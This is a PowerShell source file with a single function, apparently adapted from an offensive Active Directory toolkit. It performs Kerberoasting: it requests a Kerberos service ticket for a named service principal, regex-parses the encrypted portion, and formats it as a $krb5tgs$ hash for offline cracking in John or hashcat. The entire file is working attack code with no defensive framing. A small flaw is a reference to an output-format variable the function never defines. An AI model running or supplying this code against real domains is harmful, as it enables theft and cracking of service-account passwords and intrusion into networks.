function dumpKTKT([string]$spn, [string]$SamAccountName) {
    $DistinguishedName = 'UNKNOWN'
    Add-Type -AssemblyName System.IdentityModel 
    $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn

    if ($Ticket) {
        $TicketByteStream = $Ticket.GetRequest()
    }
    if ($TicketByteStream) {
        $Out = New-Object PSObject

        $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
        
        if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
            $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
            $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
            $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

            # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
            if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                $Hash = $null
                $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
            } else {
                $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
            }
        } else {
            Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
            $Hash = $null
            $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
        }

        if($Hash) {
            if ($OutputFormat -match 'John') {
                $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
            }
            else {
                if ($DistinguishedName -ne 'UNKNOWN') {
                    $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                }
                else {
                    $UserDomain = 'UNKNOWN'
                }

                # hashcat output format
                $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
            }
            $Out | Add-Member Noteproperty 'Hash' $HashFormat
        }

        $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
        $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
        $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
        $Out.PSObject.TypeNames.Insert(0, 'SPNTicket')
        Write-Output $Out
    }

}